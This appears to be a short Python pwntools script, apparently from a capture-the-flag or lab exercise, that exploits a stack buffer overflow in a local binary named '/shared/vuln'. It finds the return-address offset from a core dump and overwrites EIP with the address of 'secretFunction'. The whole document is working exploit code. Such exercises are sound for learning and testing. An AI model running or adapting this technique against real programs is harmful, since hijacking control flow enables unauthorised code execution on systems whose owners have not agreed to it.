from pwn import * 

vuln = '/shared/vuln'

# find overloading pointer
payload = cyclic(36)
p = process(vuln)
p.sendline(payload)
p.wait_for_close()
core = Coredump('./core')
length = cyclic_find(core.eip)

# find addr we need
# addr is 4 bytes
e = ELF(vuln)
ptrstr = p32(e.symbols['secretFunction'])

payload = "a" * int(length) + ptrstr

p = process(vuln)
p.sendline(payload)
print p.recvall()